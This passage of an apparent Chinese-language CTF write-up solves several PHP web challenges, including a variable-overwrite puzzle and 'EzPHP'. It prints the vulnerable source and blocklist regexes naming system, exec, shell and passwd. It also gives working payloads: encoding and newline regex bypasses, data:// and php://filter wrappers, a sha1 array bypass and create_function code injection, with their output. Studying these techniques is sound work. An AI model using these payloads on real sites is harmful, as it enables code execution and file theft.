class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现此题考点是php特性(双$变量覆盖)，我们进行代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//post传参：yds=is   ---$yds=is</span></span><br><span class="line"><span class="comment">//就是上面这样，并不是将$is的值赋值给$yds</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//get传参：yds=is ---$yds=$is</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此为数组循环 get传参：flag=is</span></span><br><span class="line"><span class="comment">//if进行判断，是判断$_GET[flag]的值是否等于键，并且键不能等于flag。</span></span><br><span class="line"><span class="comment">//只要其中一条我们不满足就可以绕过。</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断get传参和post传参的flag是否为空，为空false，不为空true。</span></span><br><span class="line"><span class="comment">//如果这里要绕过，post和get就不能为空。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断flag键的值是否等于flag ，必须两个都不满足，才可以。</span></span><br></pre></td></tr></table></figure><p>最简单的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br><span class="line">经过的流程： $yds=$flag ----&gt; 第一个if判断为false ------&gt; 第二个if判断为true -----&gt;exit($yds)</span><br><span class="line">这就是为啥我认为最开始的dog是有用信息。</span><br></pre></td></tr></table></figure><p>方法2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;handsome=is&amp;flag=is</span><br><span class="line">经过的流程：$is=$flag --&gt; $handsome=$is --&gt; $flag=$is ---&gt;第一个判断的第一次循环为true ---&gt;输出flag</span><br></pre></td></tr></table></figure><h2 id="EzPHP"><a href="#EzPHP" class="headerlink" title="EzPHP"></a>EzPHP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此代码对于这道题真的非常有用。</span></span><br><span class="line"><span class="comment">#author:wArn</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">word_split</span>(<span class="params">pattern</span>):</span><br><span class="line">    temporary_pattern = re.split(<span class="string">r&#x27;\|&#x27;</span>,pattern)</span><br><span class="line">    array_pattern = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> temporary_pattern:</span><br><span class="line">        <span class="keyword">if</span> i.startswith(<span class="string">&#x27;\\&#x27;</span>):</span><br><span class="line">            array_pattern.append(i[<span class="number">1</span>:])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            array_pattern.append(i)</span><br><span class="line">    <span class="keyword">return</span> array_pattern</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">examine</span>(<span class="params">array_pattern</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        str1 = <span class="built_in">input</span>(<span class="string">&quot;function:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> str1 == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> array_pattern:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">r&#x27;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log&#x27;</span></span><br><span class="line">    array = word_split(<span class="built_in">str</span>)</span><br><span class="line">    examine(array)</span><br><span class="line">    str2 = <span class="string">r&#x27;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x27;</span></span><br><span class="line">    array1 = word_split(str2)</span><br><span class="line">    examine(array1)</span><br></pre></td></tr></table></figure><p>查看网页源码，发现<code>Here is the real page =w= GFXEIM3YFZYGQ4A=</code></p><p>收集到的信息：这是真正的页面 ，一个密文 ，当时还以为是base64编码 ，base64解码 ，发现解码后是乱码 ，通过deepseek知道 ，密文为base32编码 ，base32编码是通过<code>[A-Z][2-7]</code>表示二进制数据的编码方式 ，不区分大小写 ，一个字母或数字base32加密后为两位 ，比如<code>a</code>&#x3D;&#x3D;&#x3D;&gt;<code>ME</code> ，上面内容编码后为<code>1nD3x.php</code>。</p><p>进入页面后:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//QUERY_STRING获取查询字符串并且不会进行解码,所以我们可以通过编码绕过。$_SERVER获取服务信息和执行信息，$_SERVER几乎一定存在，所以这个判定一定会进行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"><span class="comment">//preg_match会被%0a截断，(^内容$)严格比较。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//$_REQUEST包含$_GET、$_POST、$_COOKIE，其参数的加载顺序由request_order决定，默认情况下是先加载GET后加载POST，所以POST可以覆盖GET。</span></span><br><span class="line"><span class="comment">//preg_match仅支持字符串作为参数。接受数组后会返回false。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//此可以通过data协议来绕过。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">sha1</span>(<span class="variable">$shana</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//并没有进行强制类型转换所以我们能利用数组进行绕过。</span></span><br><span class="line"><span class="comment">//extract可以将数组内的键与值转换为变量。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//考察的是create_function,值得注意的是preg_match里面并没有过滤_,所以直接create_function可以直接绕过。</span></span><br></pre></td></tr></table></figure><p>进行代码审计，我就在上面进行代码审计。<code>QUERY_STRING</code>不会进行解码,所以我们可以通过编码绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%64ebu=%61qua_is_%63ute%0a</span><br></pre></td></tr></table></figure><p>回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</span><br><span class="line">Neeeeee! Good Job!</span><br><span class="line">fxck you! I hate English!</span><br></pre></td></tr></table></figure><p>在代码审计的时候，我们看到了，$_REQUEST在默认情况下，post的键和get的键相同时，post的值会覆盖get的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?%64ebu=%61qua_is_%63ute%0a</span><br><span class="line">post:debu=1</span><br></pre></td></tr></table></figure><p>回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</span><br><span class="line">Neeeeee! Good Job!</span><br><span class="line">Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?</span><br></pre></td></tr></table></figure><p>$_REQUEST绕过去了，file_get_contents进行文件包含，而我并不知道任何文件内容有这个东西，所以想到data协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?%64ebu=%61qua_is_%63ute%0a&amp;file=data://plain/text,%64ebu_%64ebu_%61qua</span><br><span class="line">post:debu=1&amp;file=1</span><br></pre></td></tr></table></figure><p>回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Neeeeee! Good Job!</span><br><span class="line">fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!</span><br></pre></td></tr></table></figure><p>现在到了sha1比较了，由于没有强制类型转换，所以我们可以通过数组绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?%64ebu=%61qua_is_%63ute%0a&amp;file=data://plain/text,%64ebu_%64ebu_%61qua&amp;shan%61[]=1&amp;p%61sswd[]=2</span><br><span class="line">post:debu=1&amp;file=1</span><br></pre></td></tr></table></figure><p>回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</span><br><span class="line">Neeeeee! Good Job!</span><br><span class="line">Very good! you know my password. But what is flag?</span><br><span class="line"></span><br><span class="line">Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=</span><br></pre></td></tr></table></figure><p>最后一个考点考的时create_function。</p><p>说一说为什么下面的<code>fl%61g[%63ode]=create_function&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</code>，不用在post进行变量覆盖了，preg_match祈求的是字符串而不是数组，如果是数组的话，就会返回false。<strong>学习的新用法</strong>:flag[arg]和flag[code]进行变量覆盖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?%64ebu=%61qua_is_%63ute%0a&amp;file=data://plain/text,%64ebu_%64ebu_%61qua&amp;shan%61[]=1&amp;p%61sswd[]=2&amp;fl%61g[%63ode]=create_function&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</span><br><span class="line">post:debu=1&amp;file=1</span><br></pre></td></tr></table></figure><p>回显的部分内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  [&quot;ffffffff11111114ggggg&quot;]=&gt;</span><br><span class="line">  string(89) &quot;Baka, do you think it&#x27;s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告诉我们flag在rea1fl4g.php中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?%64ebu=%61qua_is_%63ute%0a&amp;file=data://plain/text,%64ebu_%64ebu_%61qua&amp;shan%61[]=1&amp;p%61sswd[]=2&amp;fl%61g[%63ode]=create_function&amp;fl%61g[%61rg]=&#125;require(base64_decode(MW5EM3gucGhw));var_dump(get_defined_vars());//</span><br><span class="line">post:debu=1&amp;file=1</span><br></pre></td></tr></table></figure><p>回显部分内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  [&quot;f4ke_flag&quot;]=&gt;</span><br><span class="line">  string(28) &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是假的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;php://filter/convert.iconv.utf8.utf16/resource=rea1fl4g.php&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%96%9C%90%91%89%D1%8A%8B%99%C7%D1%8A%8B%99%CE%C9%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?%64ebu=%61qua_is_%63ute%0a&amp;file=data://plain/text,%64ebu_%64ebu_%61qua&amp;shan%61[]=1&amp;p%61sswd[]=2&amp;fl%61g[%63ode]=create_function&amp;fl%61g[%61rg]=&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%96%9C%90%91%89%D1%8A%8B%99%C7%D1%8A%8B%99%CE%C9%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</span><br><span class="line">post:debu=1&amp;file=1</span><br></pre></td></tr></table></figure><p>回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;�html&gt; &lt;�head&gt; &lt;�meta charset=&quot;utf-8&quot;&gt; &lt;�meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;�meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;&gt; &lt;�title&gt;Real_Flag In Here!!!&lt;�/title&gt; &lt;�/head&gt; &lt;�/html&gt; &lt;�?php echo &quot;T�O`\Eq6b~R0bN��N 徢wR0徺S鍕軳_N N銏hO`\1€齜�R0flagT�&quot;; $f4ke_flag = &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;; $rea1_f1114g = &quot;flag&#123;e22f0e7b-65c6-46a2-9502-86c2e8c684b5&#125;&quot;; unset($rea1_f1114g);</span><br><span class="line">//unset 清除变量</span><br></pre></td></tr></table></figure><h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><p>收集信息：在响应头里发现php版本为php&#x2F;5.6.40，并没有显示其用的是啥web服务。</p><p>进行代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="comment">//file_get_contents进行文件包含，我们并不知道文件名，一般不是data协议，就是filter链。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span 